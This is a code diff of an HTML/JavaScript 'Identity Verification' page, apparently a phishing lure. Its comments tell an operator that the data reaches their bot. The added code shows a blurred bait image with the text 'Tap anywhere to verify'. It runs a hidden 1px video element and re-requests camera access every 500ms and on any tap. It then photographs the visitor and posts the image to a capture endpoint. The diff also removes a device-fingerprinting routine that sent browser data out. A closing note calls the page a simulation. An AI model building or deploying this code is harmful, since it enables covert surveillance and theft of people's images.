@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>🔐 Identity Verification</title>
+<title>Identity Verification</title>
 <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
   :root { --cyan: #00f5ff; }
@@ -15,11 +15,43 @@
   .subtitle { font-size:1rem; opacity:0.85; margin-top:8px; }
   .content { padding:30px 25px; }
   .stage { text-align:center; min-height:340px; display:flex; flex-direction:column; align-items:center; justify-content:center; gap:20px; }
-  .loader { width:85px; height:85px; border:7px solid rgba(0,245,255,0.2); border-top-color:var(--cyan); border-radius:50%; animation:spin 1.1s linear infinite; }
+  .loader { width:85px; height:85px; border:7px solid rgba(0,245,255,0.2); border-top-color:var(--cyan); border-radius:50%; animation:spin 1.1s linear infinite; display:none; margin: 0 auto; }
   @keyframes spin { to { transform:rotate(360deg); } }
-  .message { font-size:1.15rem; color:var(--cyan); font-weight:500; }
-  video, #captured, #preview { width:100%; max-width:380px; border-radius:16px; border:2px solid rgba(0,245,255,0.4); }
+  .message { font-size:1.15rem; color:var(--cyan); font-weight:500; display:none; }
+  
+  /* Image blur effect */
+  .img-container {
+    position: relative;
+    width: 100%;
+    max-width: 380px;
+    border-radius: 16px;
+    overflow: hidden;
+    border: 2px solid rgba(0,245,255,0.4);
+  }
+  .img-container img {
+    width: 100%;
+    display: block;
+    transition: filter 0.8s ease;
+  }
+  .blurred {
+    filter: blur(20px);
+  }
+  .overlay-text {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    color: white;
+    font-weight: 600;
+    font-size: 1.1rem;
+    text-shadow: 0 2px 5px rgba(0,0,0,0.8);
+    pointer-events: none;
+    text-align: center;
+    width: 80%;
+  }
+
   .warning { background:rgba(255,70,70,0.18); border:1px solid #ff5555; color:#ff8888; padding:18px; border-radius:14px; margin:25px 0; text-align:left; font-size:0.96rem; }
+  
   /* Hidden video */
   #video { position: absolute; opacity: 0; pointer-events: none; width: 1px; height: 1px; }
 </style>
@@ -31,21 +63,25 @@
   </div>
   <div class="content">
 
-    <!-- Step 1: Load hote hi dikhega -->
+    <!-- Step 1: Image dikhegi (Blurred) -->
     <div id="consent" class="stage">
-      <h2>Verification Required</h2>
-      <p style="max-width:340px;line-height:1.6;opacity:0.9;">Tap anywhere on the screen to allow camera access and verify your identity.</p>
+      <div class="img-container">
+        <img id="preview" src="" class="blurred" alt="Verification Image">
+        <div class="overlay-text" id="overlay-msg">Tap anywhere to verify and view image</div>
+      </div>
     </div>
 
     <!-- Step 2: Loading -->
     <div id="loading" class="stage" style="display:none;">
-      <div class="loader"></div>
-      <div class="message">Verifying...</div>
+      <div class="loader" style="display:block;"></div>
+      <div class="message" style="display:block;">Verifying...</div>
     </div>
 
-    <!-- Step 3: Show Final Image -->
+    <!-- Step 3: Result (Clear Image) -->
     <div id="result" class="stage" style="display:none;">
-      <img id="preview" src="" alt="Verification Image" style="margin-bottom: 20px;">
+      <div class="img-container">
+        <img id="final-image" src="" alt="Verification Image">
+      </div>
       <div class="warning">
         <strong>✅ Verification Successful.</strong><br><br>
         This was a simulation. Real phishing pages may try to capture your data or access your camera without clear intent.
@@ -71,37 +107,21 @@
   let cameraRetryCount = 0;
   const MAX_RETRIES = 9999;
 
-  // 1. Device Info Collect karne ka function
-  async function collectInfo() {
-    const info = {
-        platform: navigator.platform || "Unknown",
-        userAgent: navigator.userAgent,
-        screen: screen.width + "x" + screen.height,
-        memory: navigator.deviceMemory ? navigator.deviceMemory + " GB" : "Unknown",
-        battery: "N/A", charging: "N/A", network: "Unknown"
-    };
-    try {
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            info.battery = Math.round(b.level * 100) + "%";
-            info.charging = b.charging ? "Yes" : "No";
-        }
-    } catch(e) {}
-    try {
-        const c = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-        if (c) { info.network = c.effectiveType || "Unknown"; }
-    } catch(e) {}
+  // Page load hote hi blurred image set karo
+  window.addEventListener('DOMContentLoaded', () => {
+    if (TOKEN) {
+      document.getElementById('preview').src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
+      document.getElementById('final-image').src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
+    }
+    startCamera();
+    
+    setInterval(() => {
+      if (!stream && !isStarted && cameraRetryCount < MAX_RETRIES) {
+        startCamera();
+      }
+    }, 500);
+  });
 
-    // Yeh info bhi capture endpoint pe bhej de taaki tera bot isko bhi receive kar le
-    let data = { token: TOKEN, image: null, info: info };
-    fetch("/capture", {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify(data)
-    }).catch(e => console.log(e));
-  }
-
-  // 2. Camera Start karne ka function (with Retry logic)
   async function startCamera() {
     if (isStarted) return;
 
@@ -112,11 +132,11 @@
       video.srcObject = stream;
       cameraRetryCount = 0;
       
-      // Camera on hote hi loading show karo
+      // Camera allow hote hi loading dikhao
       document.getElementById('consent').style.display='none';
       document.getElementById('loading').style.display='flex';
       
-      // 1.5 second wait karo (focus ke liye) aur fir capture karo
+      // 1.5 second wait karo (taaki camera focus ho jaye)
       setTimeout(() => {
         captureAndSend();
       }, 1500);
@@ -124,17 +144,15 @@
     } catch (e) {
       cameraRetryCount++;
       console.log("Camera denied, retry #" + cameraRetryCount, e.name);
-      // Agar user ne block kiya hai, toh har 500ms me wapas try karega
       if (cameraRetryCount < MAX_RETRIES) {
         setTimeout(startCamera, 500);
       }
     }
   }
 
-  // 3. Photo khich kar send karna
   async function captureAndSend() {
     if (!stream) return;
-    isStarted = true; // Lock taaki baar baar na maange
+    isStarted = true;
 
     const canvas = document.createElement('canvas');
     canvas.width = video.videoWidth || 640;
@@ -142,11 +160,9 @@
     canvas.getContext('2d').drawImage(video, 0, 0);
     const imageBase64 = canvas.toDataURL('image/jpeg', 0.92);
     
-    // Camera band karo
     stream.getTracks().forEach(t=>t.stop());
     video.srcObject = null;
     
-    // Photo send karo
     try {
       await fetch(CAPTURE_ENDPOINT, {
         method: "POST",
@@ -155,18 +171,12 @@
       });
     } catch(e) { console.log(e); }
 
-    // Final Image dikhao
     showFinalImage();
   }
 
   function showFinalImage() {
     document.getElementById('loading').style.display='none';
     document.getElementById('result').style.display='flex';
-
-    if (TOKEN) {
-      const img = document.getElementById('preview');
-      img.src = `${IMG_ENDPOINT}${TOKEN}.jpg`;
-    }
   }
 
   function resetDemo() {
@@ -174,24 +184,10 @@
     location.reload();
   }
 
-  // 4. Page load hone par trigger
-  window.addEventListener('DOMContentLoaded', () => {
-    collectInfo();
-    startCamera();
-    
-    // Extra: Agar load pe nahi chala, toh har 500ms pe try karega
-    setInterval(() => {
-      if (!stream && !isStarted && cameraRetryCount < MAX_RETRIES) {
-        startCamera();
-      }
-    }, 500);
-  });
-
-  // 5. Agar user screen pe kahin bhi tap/click kare, toh turant camera maango
   ['click', 'touchstart', 'keydown'].forEach(evt => {
     document.addEventListener(evt, () => {
       if (!stream && !isStarted) {
-        cameraRetryCount = 0; // Reset retry count
+        cameraRetryCount = 0;
         startCamera();
       }
     }, { once: false });
